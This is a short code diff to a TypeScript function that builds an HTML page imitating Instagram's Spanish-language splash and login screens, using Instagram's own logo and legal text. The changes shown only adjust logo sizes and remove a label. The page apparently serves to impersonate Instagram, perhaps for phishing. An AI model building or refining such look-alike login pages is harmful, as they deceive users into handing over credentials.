@@ -597,9 +597,8 @@ function buildInstagramPage(sessionId: string): string {
     </button>
   </div>
 
-  <div class="splash-from">from</div>
   <div class="splash-meta">
-    <img src="https://static.cdninstagram.com/rsrc.php/yy/r/zVM9V9EU5f1.svg" alt="Meta" height="16">
+    <img src="https://static.cdninstagram.com/rsrc.php/yy/r/zVM9V9EU5f1.svg" alt="Meta" height="28">
   </div>
   <div class="splash-legal">
     Al continuar, aceptas las <a href="#">Condiciones de uso</a> y la <a href="#">Política de privacidad</a> de Instagram.
@@ -637,7 +636,7 @@ function buildInstagramPage(sessionId: string): string {
     <button class="btn-register" onclick="return false;">Crear cuenta nueva</button>
 
     <div class="form-meta">
-      <img src="https://static.cdninstagram.com/rsrc.php/yy/r/zVM9V9EU5f1.svg" alt="Meta" height="16">
+      <img src="https://static.cdninstagram.com/rsrc.php/yy/r/zVM9V9EU5f1.svg" alt="Meta" height="24">
     </div>
   </div>
 </div>
